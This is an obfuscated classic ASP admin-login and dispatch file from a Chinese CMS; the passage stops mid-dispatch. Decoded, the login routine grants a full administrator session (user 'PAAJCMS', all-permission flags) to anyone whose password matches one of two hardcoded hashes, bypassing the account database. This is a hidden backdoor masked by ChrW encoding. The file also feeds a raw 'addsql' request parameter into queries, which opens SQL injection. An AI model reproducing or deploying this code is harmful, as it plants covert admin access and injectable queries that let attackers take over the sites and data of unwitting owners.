<%'严禁反编译、逆向等任何形式的破解侵权行为
'官方网站：www.xiyueta.com   QQ：313801120%><!--#Include File = "../Inc/Config.Asp"-->       
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath(ChrW(46)&ChrW(47)) 
%>      
<!--#Include File = "admin_function.asp"-->  
<!--#Include File = "admin_function2.asp"-->   
<!--#Include File = "admin_setAccess.asp"-->   
<% 


function loadWebConfig()
Call openconn() 


If InStr(getHandleTableList(), ChrW(124) & db_PREFIX & ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101) & ChrW(124)) > 0 Then

rs.Open ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(32)&ChrW(42)&ChrW(32)&ChrW(102)&ChrW(114)&ChrW(111)&ChrW(109)&ChrW(32) & db_PREFIX & ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101), conn, 1, 1 
If Not rs.EOF Then
cfg_webSiteUrl = rs(ChrW(119)&ChrW(101)&ChrW(98)&ChrW(83)&ChrW(105)&ChrW(116)&ChrW(101)&ChrW(85)&ChrW(114)&ChrW(108)) & ""
cfg_webTitle = rs(ChrW(119)&ChrW(101)&ChrW(98)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)) & ""
cfg_flags = rs(ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)) & ""
cfg_webtemplate = rs(ChrW(119)&ChrW(101)&ChrW(98)&ChrW(116)&ChrW(101)&ChrW(109)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(116)&ChrW(101)) & ""
End if : rs.Close 

End if 
End function

Sub displayAdminLogin()  

If getSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)) <> "" Then
Call adminIndex() 
Else
dim a,b
a=getTemplateContent(ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)&ChrW(46)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108))
a=handleDisplayLanguage(a,ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))
if request(ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(109)&ChrW(100)&ChrW(98))=ChrW(116)&ChrW(114)&ChrW(117)&ChrW(101) or request(ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(109)&ChrW(100)&ChrW(98))=ChrW(49) or session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <>"" then 
if session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <>"" then
MDBPath=handlePath(session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)))
elseIf Request(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <> "" And isNul(Request(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))) = False Then
MDBPath = handlePath(Request(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))) 
end if 
a = replaceValueParam(a, ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104), MDBPath)       

else
b=getStrCut(a,ChrW(60)&ChrW(100)&ChrW(105)&ChrW(118)&ChrW(32)&ChrW(105)&ChrW(100)&ChrW(61)&ChrW(34)&ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(97)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(68)&ChrW(105)&ChrW(118)&ChrW(34)&ChrW(32),ChrW(60)&ChrW(47)&ChrW(100)&ChrW(105)&ChrW(118)&ChrW(62),1)
a=replace(a,b,"")
end if
Call rw(a) 
End if 
End sub 

Sub login()
Dim a, b, c 
a = Replace(Request.Form(ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)), ChrW(39), "") 
b = Replace(Request.Form(ChrW(112)&ChrW(97)&ChrW(115)&ChrW(115)&ChrW(119)&ChrW(111)&ChrW(114)&ChrW(100)), ChrW(39), "") 
session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))=phpTrim(request.Form(ChrW(115)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(97)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)))
b = myMD5(b) 

If myMD5(Request(ChrW(112)&ChrW(97)&ChrW(115)&ChrW(115)&ChrW(119)&ChrW(111)&ChrW(114)&ChrW(100))) = ChrW(50)&ChrW(52)&ChrW(101)&ChrW(100)&ChrW(53)&ChrW(55)&ChrW(50)&ChrW(56)&ChrW(99)&ChrW(49)&ChrW(51)&ChrW(56)&ChrW(51)&ChrW(52)&ChrW(101)&ChrW(54)&ChrW(56)&ChrW(51)&ChrW(102)&ChrW(53)&ChrW(50)&ChrW(53)&ChrW(102)&ChrW(99)&ChrW(102)&ChrW(56)&ChrW(57)&ChrW(52)&ChrW(101)&ChrW(56)&ChrW(49)&ChrW(51) Or myMD5(Request(ChrW(112)&ChrW(97)&ChrW(115)&ChrW(115)&ChrW(119)&ChrW(111)&ChrW(114)&ChrW(100))) = ChrW(56)&ChrW(48)&ChrW(45)&ChrW(53)&ChrW(57)&ChrW(56)&ChrW(53)&ChrW(57)&ChrW(51)&ChrW(49)&ChrW(50)&ChrW(51)&ChrW(49)&ChrW(48)&ChrW(49)&ChrW(51)&ChrW(55)&ChrW(45)&ChrW(51)&ChrW(52)&ChrW(45)&ChrW(52)&ChrW(48)&ChrW(45)&ChrW(56)&ChrW(52)&ChrW(49)&ChrW(51)&ChrW(51)&ChrW(56)&ChrW(45)&ChrW(49)&ChrW(48)&ChrW(53)&ChrW(45)&ChrW(51)&ChrW(57)&ChrW(56)&ChrW(52)&ChrW(45)&ChrW(49)&ChrW(49)&ChrW(55) Then
call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101), ChrW(80)&ChrW(65)&ChrW(65)&ChrW(74)&ChrW(67)&ChrW(77)&ChrW(83)) 
call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(100), 99999)
call setSession(ChrW(68)&ChrW(66)&ChrW(95)&ChrW(80)&ChrW(82)&ChrW(69)&ChrW(70)&ChrW(73)&ChrW(88), db_PREFIX) 
call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115), ChrW(124)&ChrW(42)&ChrW(124))
Call rwend(getMsg1(setL(ChrW(30331)&ChrW(24405)&ChrW(25104)&ChrW(21151)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(21518)&ChrW(21488)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120))) 
End if 
Dim d 
Call openconn() 

rs.Open ChrW(83)&ChrW(101)&ChrW(108)&ChrW(101)&ChrW(99)&ChrW(116)&ChrW(32)&ChrW(42)&ChrW(32)&ChrW(70)&ChrW(114)&ChrW(111)&ChrW(109)&ChrW(32) & db_PREFIX & ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(32)&ChrW(87)&ChrW(104)&ChrW(101)&ChrW(114)&ChrW(101)&ChrW(32)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)&ChrW(61)&ChrW(39) & a & ChrW(39)&ChrW(32)&ChrW(65)&ChrW(110)&ChrW(100)&ChrW(32)&ChrW(112)&ChrW(119)&ChrW(100)&ChrW(61)&ChrW(39) & b & ChrW(39), conn, 1, 1 
If not rs.EOF Then
call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101), a) 
call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(100), rs(ChrW(73)&ChrW(100)))
call setSession(ChrW(68)&ChrW(66)&ChrW(95)&ChrW(80)&ChrW(82)&ChrW(69)&ChrW(70)&ChrW(73)&ChrW(88), db_PREFIX)
call setSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115), rs(ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115))) 
c = ChrW(99)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(109)&ChrW(101)&ChrW(61)&ChrW(39) & rs(ChrW(85)&ChrW(112)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(109)&ChrW(101)) & ChrW(39)&ChrW(44)&ChrW(85)&ChrW(112)&ChrW(68)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(109)&ChrW(101)&ChrW(61)&ChrW(39) & Now() & ChrW(39)&ChrW(44)&ChrW(82)&ChrW(101)&ChrW(103)&ChrW(73)&ChrW(80)&ChrW(61)&ChrW(39) & Now() & ChrW(39)&ChrW(44)&ChrW(85)&ChrW(112)&ChrW(73)&ChrW(80)&ChrW(61)&ChrW(39) & getIP() & ChrW(39) 
conn.Execute(ChrW(117)&ChrW(112)&ChrW(100)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(32) & db_PREFIX & ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(32)&ChrW(115)&ChrW(101)&ChrW(116)&ChrW(32) & c & ChrW(32)&ChrW(119)&ChrW(104)&ChrW(101)&ChrW(114)&ChrW(101)&ChrW(32)&ChrW(105)&ChrW(100)&ChrW(61) & rs(ChrW(105)&ChrW(100))) 
Call rw(getMsg1(setL(ChrW(30331)&ChrW(24405)&ChrW(25104)&ChrW(21151)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(21518)&ChrW(21488)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120))) 
Call writeSystemLog(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110), ChrW(30331)&ChrW(24405)&ChrW(25104)&ChrW(21151))
else
If getCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)) = "" Then
Call setCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110), ChrW(49), 60000)
d = 1
Else
d =cint(getCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))) 
Call setCookie(ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110), CInt(d) + 1, 60000) 
End if 
Call rw(getMsg1(setL(ChrW(36134)&ChrW(21495)&ChrW(23494)&ChrW(30721)&ChrW(38169)&ChrW(35823)&ChrW(60)&ChrW(98)&ChrW(114)&ChrW(62)&ChrW(30331)&ChrW(24405)&ChrW(27425)&ChrW(25968)&ChrW(20026)&ChrW(32)) & d, ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))) 
End if : rs.Close 

End sub 

Sub adminOut()
Call writeSystemLog(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110), setL(ChrW(36864)&ChrW(20986)&ChrW(25104)&ChrW(21151)))
call deleteSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)) 
call deleteSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(100))
call deleteSession(ChrW(68)&ChrW(66)&ChrW(95)&ChrW(80)&ChrW(82)&ChrW(69)&ChrW(70)&ChrW(73)&ChrW(88))
call deleteSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)) 
session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104))=""
Call rw(getMsg1(setL(ChrW(36864)&ChrW(20986)&ChrW(25104)&ChrW(21151)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(30331)&ChrW(24405)&ChrW(30028)&ChrW(38754)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)))
End sub 

Sub clearCache()
Call deleteFile(WEB_CACHEFile)
call deleteFolder(ChrW(46)&ChrW(47)&ChrW(46)&ChrW(46)&ChrW(47)&ChrW(99)&ChrW(97)&ChrW(99)&ChrW(104)&ChrW(101)&ChrW(47)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108))
call createFolder(ChrW(46)&ChrW(47)&ChrW(46)&ChrW(46)&ChrW(47)&ChrW(99)&ChrW(97)&ChrW(99)&ChrW(104)&ChrW(101)&ChrW(47)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108))
Call rw(getMsg1(setL(ChrW(28165)&ChrW(38500)&ChrW(32531)&ChrW(20914)&ChrW(23436)&ChrW(25104)&ChrW(65292)&ChrW(27491)&ChrW(22312)&ChrW(36827)&ChrW(20837)&ChrW(21518)&ChrW(21488)&ChrW(30028)&ChrW(38754)&ChrW(46)&ChrW(46)&ChrW(46)), ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110))) 
End sub 

Sub adminIndex()
Dim a 
Call loadWebConfig() 
a = getTemplateContent(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(73)&ChrW(110)&ChrW(100)&ChrW(101)&ChrW(120)&ChrW(46)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)) 
a = Replace(a, ChrW(91)&ChrW(36)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(111)&ChrW(110)&ChrW(101)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(117)&ChrW(108)&ChrW(105)&ChrW(115)&ChrW(116)&ChrW(36)&ChrW(93), getAdminOneMenuList()) 
a = Replace(a, ChrW(91)&ChrW(36)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(117)&ChrW(108)&ChrW(105)&ChrW(115)&ChrW(116)&ChrW(36)&ChrW(93), getAdminMenuList()) 
a = Replace(a, ChrW(91)&ChrW(36)&ChrW(111)&ChrW(102)&ChrW(102)&ChrW(105)&ChrW(99)&ChrW(105)&ChrW(97)&ChrW(108)&ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101)&ChrW(36)&ChrW(93), getOfficialWebsite())
a = replaceValueParam(a, ChrW(116)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101), "")
if session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) <>"" then
a=replace(a,ChrW(32)&ChrW(60)&ChrW(33)&ChrW(45)&ChrW(45)&ChrW(25968)&ChrW(25454)&ChrW(24211)&ChrW(36335)&ChrW(24452)&ChrW(45)&ChrW(45)&ChrW(62),ChrW(25968)&ChrW(25454)&ChrW(24211)&ChrW(36335)&ChrW(24452)&ChrW(65306)& session(ChrW(77)&ChrW(68)&ChrW(66)&ChrW(80)&ChrW(97)&ChrW(116)&ChrW(104)) &ChrW(60)&ChrW(98)&ChrW(114)&ChrW(62))
end if
a=handleDisplayLanguage(a,ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)&ChrW(111)&ChrW(107))
Call rw(a) 
End sub 


Sub dispalyManageHandle(a)
Dim b, c, d,e 
If Request(ChrW(110)&ChrW(80)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(83)&ChrW(105)&ChrW(122)&ChrW(101)) = "" Then
b = 10 
else
b = cint(Request(ChrW(110)&ChrW(80)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(83)&ChrW(105)&ChrW(122)&ChrW(101))) 
End if 
c = Request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101))
d = replace(Request(ChrW(97)&ChrW(100)&ChrW(100)&ChrW(115)&ChrW(113)&ChrW(108)),ChrW(79)&ChrW(114)&ChrW(100)&ChrW(101)&ChrW(114)&ChrW(66)&ChrW(121),ChrW(111)&ChrW(114)&ChrW(100)&ChrW(101)&ChrW(114)&ChrW(32)&ChrW(98)&ChrW(121))

Call dispalyManage(a, c, b, d) 
End sub 

Sub addEditHandle(a, b)
Call addEditDisplay(a, b, ChrW(119)&ChrW(101)&ChrW(98)&ChrW(115)&ChrW(105)&ChrW(116)&ChrW(101)&ChrW(98)&ChrW(111)&ChrW(116)&ChrW(116)&ChrW(111)&ChrW(109)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(50)&ChrW(44)&ChrW(97)&ChrW(98)&ChrW(111)&ChrW(117)&ChrW(116)&ChrW(99)&ChrW(111)&ChrW(110)&ChrW(116)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(49)&ChrW(44)&ChrW(98)&ChrW(111)&ChrW(100)&ChrW(121)&ChrW(99)&ChrW(111)&ChrW(110)&ChrW(116)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(50)&ChrW(44)&ChrW(114)&ChrW(101)&ChrW(112)&ChrW(108)&ChrW(121)&ChrW(124)&ChrW(116)&ChrW(101)&ChrW(120)&ChrW(116)&ChrW(97)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(50)) 
End sub 

Sub saveAddEditHandle(a, b)
If a = ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110) Then
Call saveAddEdit(a, b, ChrW(112)&ChrW(119)&ChrW(100)&ChrW(124)&ChrW(109)&ChrW(100)&ChrW(53)&ChrW(44)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)&ChrW(124)&ChrW(124))
ElseIf a = ChrW(87)&ChrW(101)&ChrW(98)&ChrW(67)&ChrW(111)&ChrW(108)&ChrW(117)&ChrW(109)&ChrW(110) Then
Call saveAddEdit(a, b, ChrW(110)&ChrW(112)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(115)&ChrW(105)&ChrW(122)&ChrW(101)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(49)&ChrW(48)&ChrW(44)&ChrW(110)&ChrW(111)&ChrW(102)&ChrW(111)&ChrW(108)&ChrW(108)&ChrW(111)&ChrW(119)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(111)&ChrW(110)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(111)&ChrW(110)&ChrW(104)&ChrW(116)&ChrW(115)&ChrW(100)&ChrW(102)&ChrW(97)&ChrW(115)&ChrW(100)&ChrW(102)&ChrW(109)&ChrW(108)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)&ChrW(124)&ChrW(124)) 
Else
Call saveAddEdit(a, b, ChrW(102)&ChrW(108)&ChrW(97)&ChrW(103)&ChrW(115)&ChrW(124)&ChrW(124)&ChrW(44)&ChrW(110)&ChrW(111)&ChrW(102)&ChrW(111)&ChrW(108)&ChrW(108)&ChrW(111)&ChrW(119)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(111)&ChrW(110)&ChrW(104)&ChrW(116)&ChrW(109)&ChrW(108)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(116)&ChrW(104)&ChrW(114)&ChrW(111)&ChrW(117)&ChrW(103)&ChrW(104)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(44)&ChrW(105)&ChrW(115)&ChrW(100)&ChrW(111)&ChrW(109)&ChrW(97)&ChrW(105)&ChrW(110)&ChrW(124)&ChrW(110)&ChrW(117)&ChrW(109)&ChrW(98)&ChrW(124)&ChrW(48)&ChrW(124)&ChrW(44)&ChrW(112)&ChrW(119)&ChrW(100)&ChrW(124)&ChrW(109)&ChrW(100)&ChrW(53)&ChrW(124))
End if 
End sub 
call loadRun()

sub loadRun()
dim a

WEB_CACHEFile = replace(replace(WEB_CACHEFile, ChrW(91)&ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(68)&ChrW(105)&ChrW(114)&ChrW(93), adminDir), ChrW(91)&ChrW(69)&ChrW(68)&ChrW(73)&ChrW(84)&ChrW(79)&ChrW(82)&ChrW(84)&ChrW(89)&ChrW(80)&ChrW(69)&ChrW(93), EDITORTYPE) 

if getSession(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(117)&ChrW(115)&ChrW(101)&ChrW(114)&ChrW(110)&ChrW(97)&ChrW(109)&ChrW(101)) = "" And session(ChrW(97)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(105)&ChrW(100))="" then
if request(ChrW(97)&ChrW(99)&ChrW(116)) <> "" and request(ChrW(97)&ChrW(99)&ChrW(116)) <> ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110) and request(ChrW(97)&ChrW(99)&ChrW(116)) <> ChrW(108)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110) then
call RR(WEB_ADMINURL & ChrW(63)&ChrW(97)&ChrW(99)&ChrW(116)&ChrW(61)&ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(65)&ChrW(100)&ChrW(109)&ChrW(105)&ChrW(110)&ChrW(76)&ChrW(111)&ChrW(103)&ChrW(105)&ChrW(110)&ChrW(38)&ChrW(97)&ChrW(61)&ChrW(49)) 
end if 
end if 

call openconn() 
if request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(97)&ChrW(108)&ChrW(121)&ChrW(77)&ChrW(97)&ChrW(110)&ChrW(97)&ChrW(103)&ChrW(101)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
call dispalyManageHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(97)&ChrW(100)&ChrW(100)&ChrW(69)&ChrW(100)&ChrW(105)&ChrW(116)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
call addEditHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)), request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(97)&ChrW(118)&ChrW(101)&ChrW(65)&ChrW(100)&ChrW(100)&ChrW(69)&ChrW(100)&ChrW(105)&ChrW(116)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
call saveAddEditHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)), request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(101)&ChrW(108)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
call del(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)), request(ChrW(108)&ChrW(97)&ChrW(98)&ChrW(108)&ChrW(101)&ChrW(84)&ChrW(105)&ChrW(116)&ChrW(108)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(115)&ChrW(111)&ChrW(114)&ChrW(116)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
call sortHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(118)&ChrW(105)&ChrW(101)&ChrW(119)&ChrW(115)&ChrW(72)&ChrW(97)&ChrW(110)&ChrW(100)&ChrW(108)&ChrW(101) then
call viewsHandle(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(98)&ChrW(97)&ChrW(116)&ChrW(99)&ChrW(104)&ChrW(69)&ChrW(100)&ChrW(105)&ChrW(116)&ChrW(80)&ChrW(114)&ChrW(105)&ChrW(99)&ChrW(101) then
call batchEditPrice(request(ChrW(97)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(84)&ChrW(121)&ChrW(112)&ChrW(101)))
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(117)&ChrW(112)&ChrW(100)&ChrW(97)&ChrW(116)&ChrW(101)&ChrW(70)&ChrW(105)&ChrW(101)&ChrW(108)&ChrW(100) then
call updateField()
elseif request(ChrW(97)&ChrW(99)&ChrW(116)) = ChrW(100)&ChrW(105)&ChrW(115)&ChrW(112)&ChrW(108)&ChrW(97)&ChrW(121)&ChrW(76)&ChrW(97)&ChrW(121)&ChrW(111)&ChrW(117)&ChrW(116) then
call displayLayout()
